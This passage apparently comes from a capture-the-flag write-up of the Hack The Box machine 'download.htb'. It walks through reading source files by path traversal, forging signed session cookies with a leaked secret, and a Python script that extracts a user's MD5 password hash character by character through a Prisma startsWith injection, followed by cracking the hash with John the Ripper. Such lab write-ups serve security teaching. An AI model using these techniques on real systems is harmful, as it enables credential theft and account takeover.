+        <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">Uploaded</span> <span class="n">By</span><span class="p">:</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">AyufmApogee</span><span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
+        <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">Uploaded</span> <span class="n">By</span><span class="p">:</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">Apoplectic</span><span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
+        <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">Uploaded</span> <span class="n">By</span><span class="p">:</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">Apoplectic</span><span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
+        <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">Uploaded</span> <span class="n">By</span><span class="p">:</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">Antilogism</span><span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
+        <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">Uploaded</span> <span class="n">By</span><span class="p">:</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">Apoplectic</span><span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
+</pre></div>
+
+It is working perfectly, the <code>startsWith</code> method is functioning as expected. We are now able to see files uploaded by users whose usernames start with the <code>A</code> character.<br/><br/>
+After this success, I thought about attempting to retrieve data by entering the <code>password</code> field. Perhaps, I could extract a password using a brute-force approach.<br/><br/>
+As we've observed, the user <code>WESLEY</code> was the author mentioned in the <code>package.json</code> file. It might be a good idea to try extracting his password.<br/><br/>
+After inspecting the <code>auth.js</code> file (whose path was revealed in <code>app.js</code>), I noticed that passwords are stored in MD5:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://download.htb/files/download/..</span><span class="si">%2f</span><span class="s1">routers</span><span class="si">%2f</span><span class="s1">auth.js'</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="s2">"use strict"</span><span class="p">;</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">__importDefault</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">__importDefault</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">mod</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="nx">mod</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">mod</span><span class="p">.</span><span class="nx">__esModule</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">mod</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s2">"default"</span><span class="o">:</span><span class="w"> </span><span class="nx">mod</span><span class="w"> </span><span class="p">};</span>
+<span class="p">};</span>
+<span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">exports</span><span class="p">,</span><span class="w"> </span><span class="s2">"__esModule"</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">});</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">client_1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">"@prisma/client"</span><span class="p">);</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">express_1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">__importDefault</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s2">"express"</span><span class="p">));</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">zod_1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">__importDefault</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s2">"zod"</span><span class="p">));</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">node_crypto_1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">__importDefault</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s2">"node:crypto"</span><span class="p">));</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">router</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">express_1</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nx">Router</span><span class="p">();</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">client_1</span><span class="p">.</span><span class="nx">PrismaClient</span><span class="p">();</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">hashPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">password</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">node_crypto_1</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nx">createHash</span><span class="p">(</span><span class="s2">"md5"</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="nx">password</span><span class="p">).</span><span class="nx">digest</span><span class="p">(</span><span class="s2">"hex"</span><span class="p">);</span>
+<span class="p">};</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">LoginValidator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">zod_1</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nx">object</span><span class="p">({</span>
+<span class="w">    </span><span class="nx">username</span><span class="o">:</span><span class="w"> </span><span class="nx">zod_1</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nx">string</span><span class="p">().</span><span class="nx">min</span><span class="p">(</span><span class="mf">6</span><span class="p">).</span><span class="nx">max</span><span class="p">(</span><span class="mf">64</span><span class="p">),</span>
+<span class="w">    </span><span class="nx">password</span><span class="o">:</span><span class="w"> </span><span class="nx">zod_1</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nx">string</span><span class="p">().</span><span class="nx">min</span><span class="p">(</span><span class="mf">6</span><span class="p">).</span><span class="nx">max</span><span class="p">(</span><span class="mf">64</span><span class="p">),</span>
+<span class="p">});</span>
+<span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/login"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s2">"login.njk"</span><span class="p">);</span>
+<span class="p">});</span>
+<span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">"/login"</span><span class="p">,</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">LoginValidator</span><span class="p">.</span><span class="nx">safeParse</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">result</span><span class="p">.</span><span class="nx">success</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">flash</span><span class="p">(</span><span class="s2">"error"</span><span class="p">,</span><span class="w"> </span><span class="s2">"Your login details were invalid, please try again."</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s2">"/auth/login"</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">result</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">client</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">findFirst</span><span class="p">({</span>
+<span class="w">        </span><span class="nx">where</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">username</span><span class="o">:</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span><span class="w"> </span><span class="nx">password</span><span class="o">:</span><span class="w"> </span><span class="nx">hashPassword</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">password</span><span class="p">)</span><span class="w"> </span><span class="p">},</span>
+<span class="w">    </span><span class="p">});</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">user</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">flash</span><span class="p">(</span><span class="s2">"error"</span><span class="p">,</span><span class="w"> </span><span class="s2">"That username / password combination did not exist."</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s2">"/auth/register"</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">id</span><span class="o">:</span><span class="w"> </span><span class="nx">user</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">username</span><span class="o">:</span><span class="w"> </span><span class="nx">user</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span>
+<span class="w">    </span><span class="p">};</span>
+<span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">flash</span><span class="p">(</span><span class="s2">"success"</span><span class="p">,</span><span class="w"> </span><span class="s2">"You are now logged in."</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s2">"/home/"</span><span class="p">);</span>
+<span class="p">});</span>
+<span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/register"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s2">"register.njk"</span><span class="p">);</span>
+<span class="p">});</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">RegisterValidator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">zod_1</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nx">object</span><span class="p">({</span>
+<span class="w">    </span><span class="nx">username</span><span class="o">:</span><span class="w"> </span><span class="nx">zod_1</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nx">string</span><span class="p">().</span><span class="nx">min</span><span class="p">(</span><span class="mf">6</span><span class="p">).</span><span class="nx">max</span><span class="p">(</span><span class="mf">64</span><span class="p">),</span>
+<span class="w">    </span><span class="nx">password</span><span class="o">:</span><span class="w"> </span><span class="nx">zod_1</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nx">string</span><span class="p">().</span><span class="nx">min</span><span class="p">(</span><span class="mf">6</span><span class="p">).</span><span class="nx">max</span><span class="p">(</span><span class="mf">64</span><span class="p">),</span>
+<span class="p">});</span>
+<span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">"/register"</span><span class="p">,</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">RegisterValidator</span><span class="p">.</span><span class="nx">safeParse</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">result</span><span class="p">.</span><span class="nx">success</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">flash</span><span class="p">(</span><span class="s2">"error"</span><span class="p">,</span><span class="w"> </span><span class="s2">"Your registration details were invalid, please try again."</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s2">"/auth/register"</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">result</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">existingUser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">client</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">findFirst</span><span class="p">({</span>
+<span class="w">        </span><span class="nx">where</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">username</span><span class="o">:</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">username</span><span class="w"> </span><span class="p">},</span>
+<span class="w">    </span><span class="p">});</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">existingUser</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">flash</span><span class="p">(</span><span class="s2">"error"</span><span class="p">,</span><span class="w"> </span><span class="s2">"There is already a user with that email address or username."</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s2">"/auth/register"</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">client</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">create</span><span class="p">({</span>
+<span class="w">        </span><span class="nx">data</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">username</span><span class="o">:</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span>
+<span class="w">            </span><span class="nx">password</span><span class="o">:</span><span class="w"> </span><span class="nx">hashPassword</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">password</span><span class="p">),</span>
+<span class="w">        </span><span class="p">},</span>
+<span class="w">    </span><span class="p">});</span>
+<span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">flash</span><span class="p">(</span><span class="s2">"success"</span><span class="p">,</span><span class="w"> </span><span class="s2">"Your account has been registered."</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s2">"/auth/login"</span><span class="p">);</span>
+<span class="p">});</span>
+<span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/logout"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">)</span>
+<span class="w">        </span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">flash</span><span class="p">(</span><span class="s2">"success"</span><span class="p">,</span><span class="w"> </span><span class="s2">"You have been successfully logged out."</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s2">"/auth/login"</span><span class="p">);</span>
+<span class="p">});</span>
+<span class="nx">exports</span><span class="p">.</span><span class="k">default</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">router</span><span class="p">;</span>
+</pre></div>
+
+We can confirm this by examining what happens during the registration of a new user:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://download.htb/files/download/..</span><span class="si">%2f</span><span class="s1">routers</span><span class="si">%2f</span><span class="s1">auth.js'</span> <span class="o">|</span> <span class="n">grep</span> <span class="s1">'client.user.create'</span> <span class="o">-</span><span class="n">A</span> <span class="mi">5</span>
+    <span class="k">await</span> <span class="n">client</span><span class="o">.</span><span class="n">user</span><span class="o">.</span><span class="n">create</span><span class="p">({</span>
+        <span class="n">data</span><span class="p">:</span> <span class="p">{</span>
+            <span class="n">username</span><span class="p">:</span> <span class="n">data</span><span class="o">.</span><span class="n">username</span><span class="p">,</span>
+            <span class="n">password</span><span class="p">:</span> <span class="n">hashPassword</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">password</span><span class="p">),</span>
+        <span class="p">},</span>
+    <span class="p">});</span>
+</pre></div>
+
+When storing the password in the database, it invokes the <code>hashPassword</code> function, which converts the string parameters to MD5:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://download.htb/files/download/..</span><span class="si">%2f</span><span class="s1">routers</span><span class="si">%2f</span><span class="s1">auth.js'</span> <span class="o">|</span> <span class="n">grep</span> <span class="s1">'const hashPassword'</span> <span class="o">-</span><span class="n">A</span> <span class="mi">2</span>
+<span class="n">const</span> <span class="n">hashPassword</span> <span class="o">=</span> <span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="n">node_crypto_1</span><span class="o">.</span><span class="n">default</span><span class="o">.</span><span class="n">createHash</span><span class="p">(</span><span class="s2">"md5"</span><span class="p">)</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">(</span><span class="s2">"hex"</span><span class="p">);</span>
+<span class="p">};</span>
+</pre></div>
+
+We need to keep in mind this information because, when extracting the password, we will obtain a string that is 32 characters long, consisting of characters from <code>a</code> to <code>f</code> in the alphabet and digits from <code>0</code> to <code>9</code>.<br/><br/>
+Before attempting this with the <code>WESLEY</code> user, we need to confirm that this approach works. Therefore, I will first extract my user password.<br/><br/>
+I entered <code>elswix123</code> as my user password. When converted to MD5, it will be <code>11d9322277be7d00e624bc2c59276f4c</code>.<br/><br/>
+The cookie will be as follows:<br/><br/>
+<div class="highlight"><pre><span></span><span class="p">{</span><span class="nt">"flashes"</span><span class="p">:{</span><span class="nt">"info"</span><span class="p">:[],</span><span class="nt">"error"</span><span class="p">:[],</span><span class="nt">"success"</span><span class="p">:[]},</span><span class="nt">"user"</span><span class="p">:{</span><span class="nt">"username"</span><span class="p">:</span><span class="s2">"elswix"</span><span class="p">,</span><span class="nt">"password"</span><span class="p">:{</span><span class="nt">"startsWith"</span><span class="p">:</span><span class="s2">"%s"</span><span class="p">}}}</span>
+</pre></div>
+<code>%s</code> will be replaced with the characters during the Python script.<br/><br/>
+Here is the automation script:<br/><br/>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python3 </span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> 
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">pdb</span> 
+<span class="kn">import</span> <span class="nn">json</span> 
+<span class="kn">import</span> <span class="nn">string</span> 
+<span class="kn">import</span> <span class="nn">subprocess</span>
+
+<span class="c1"># Global</span>
+<span class="n">home_url</span> <span class="o">=</span> <span class="s2">"http://download.htb/home/"</span>
+<span class="n">characters</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s2">"abcdef"</span>
+
+<span class="k">def</span> <span class="nf">createMaliciousCookie</span><span class="p">(</span><span class="n">char</span><span class="p">):</span>
+
+    <span class="n">malicious_cookie</span> <span class="o">=</span> <span class="s1">'{"flashes":{"info":[],"error":[],"success":[]},"user":{"username":"elswix", "password":{"startsWith":"</span><span class="si">%s</span><span class="s1">"}}}'</span> <span class="o">%</span> <span class="n">char</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"temp.tmp"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">malicious_cookie</span><span class="p">)</span>
+
+    <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="s2">"/home/elswix/.yarn/bin/cookie-monster -e -f temp.tmp --secret </span><span class="se">\"</span><span class="s2">8929874489719802418902487651347865819634518936754</span><span class="se">\"</span><span class="s2"> -n download_session"</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">session</span> <span class="o">=</span> <span class="n">output</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">"download_session="</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">" "</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">"</span><span class="se">\x1b</span><span class="s2">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> 
+    <span class="n">signature</span> <span class="o">=</span> <span class="n">output</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">"download_session.sig="</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">"</span><span class="se">\x1b</span><span class="s2">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+
+    <span class="n">cookie</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">"download_session"</span><span class="p">:</span><span class="s2">"</span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="n">session</span><span class="p">,</span>
+        <span class="s2">"download_session.sig"</span><span class="p">:</span><span class="s2">"</span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="n">signature</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="n">cookie</span> 
+
+
+
+<span class="k">def</span> <span class="nf">makeReq</span><span class="p">(</span><span class="n">maliciousCookie</span><span class="p">):</span>
+
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">home_url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">maliciousCookie</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">resp</span> 
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+
+    <span class="n">password</span> <span class="o">=</span> <span class="s2">""</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">"PASSWORD"</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">33</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">characters</span><span class="p">:</span>
+            <span class="n">test_password</span> <span class="o">=</span> <span class="n">password</span> <span class="o">+</span> <span class="n">char</span>  
+            <span class="n">maliciousCookie</span> <span class="o">=</span> <span class="n">createMaliciousCookie</span><span class="p">(</span><span class="n">test_password</span><span class="p">)</span>
+            <span class="n">resp</span> <span class="o">=</span> <span class="n">makeReq</span><span class="p">(</span><span class="n">maliciousCookie</span><span class="p">)</span>
+
+            <span class="k">if</span> <span class="s2">"No files found"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="n">password</span> <span class="o">+=</span> <span class="n">char</span>
+                <span class="n">p</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+                <span class="k">break</span>
+            <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s2">"/bin/rm temp.tmp"</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+
+
+
+
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">main</span><span class="p">()</span>
+    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">[!] Stopping...</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</pre></div>
+
+Remember to replace your <code>cookie-monster</code> binary path and the username in the cookie. Let's run the script (this may take a while):<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
+<span class="p">[</span><span class="o">&lt;</span><span class="p">]</span> <span class="n">PASSWORD</span><span class="p">:</span> <span class="mi">11</span><span class="n">d9322277be7d00e624bc2c59276f4c</span>
+</pre></div>
+
+It works great! We are successfully extracting passwords from the database. Now, let's change our username in the Python script to <code>WESLEY</code> and execute the script.<br/><br/>
+After a while, we obtained the password in MD5 format:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
+<span class="p">[</span><span class="err">└</span><span class="p">]</span> <span class="n">PASSWORD</span><span class="p">:</span> <span class="n">f88976c10af66915918945b9679b2bd3</span>
+</pre></div>
+
+Let's try to crack it using <a href="https://github.com/openwall/john">John the Ripper</a>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">john</span> <span class="o">-</span><span class="n">w</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> <span class="nb">hash</span> <span class="o">--</span><span class="nb">format</span><span class="o">=</span><span class="n">Raw</span><span class="o">-</span><span class="n">MD5</span>
+<span class="n">Using</span> <span class="n">default</span> <span class="nb">input</span> <span class="n">encoding</span><span class="p">:</span> <span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
+<span class="n">Loaded</span> <span class="mi">1</span> <span class="n">password</span> <span class="nb">hash</span> <span class="p">(</span><span class="n">Raw</span><span class="o">-</span><span class="n">MD5</span> <span class="p">[</span><span class="n">MD5</span> <span class="mi">128</span><span class="o">/</span><span class="mi">128</span> <span class="n">AVX</span> <span class="mi">4</span><span class="n">x3</span><span class="p">])</span>
+<span class="ne">Warning</span><span class="p">:</span> <span class="n">no</span> <span class="n">OpenMP</span> <span class="n">support</span> <span class="k">for</span> <span class="n">this</span> <span class="nb">hash</span> <span class="nb">type</span><span class="p">,</span> <span class="n">consider</span> <span class="o">--</span><span class="n">fork</span><span class="o">=</span><span class="mi">4</span>
